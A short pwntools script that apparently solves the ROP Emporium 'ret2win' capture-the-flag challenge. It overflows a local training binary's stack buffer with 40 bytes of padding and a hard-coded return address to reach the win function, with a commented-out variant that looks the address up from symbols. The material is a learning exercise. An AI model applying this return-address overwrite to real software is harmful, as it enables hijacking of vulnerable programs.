#!/usr/bin/python3

from pwn import *

# First simple version

process = tubes.process.process("./x86_64/ret2win")
print(process.recv().decode())
payload = b'a' * 40 + 0x0000400756.to_bytes(8, 'little')
process.sendline(payload)
print(process.recv().decode())


# More complex version, available at http://itsvipul.com/writeups/ROP_Emporium/ret2win.html

# elf = context.binary = ELF("./x86_64/ret2win")
# print("TARGET : " + hex(elf.symbols.ret2win))

# io = process(elf.path)
# ret2win = p32(elf.symbols.ret2win)
# payload = b'a' * 40 + ret2win
# io.sendline(payload)
# io.recvuntil("flag:")
# flag = io.recvline()
# success(flag)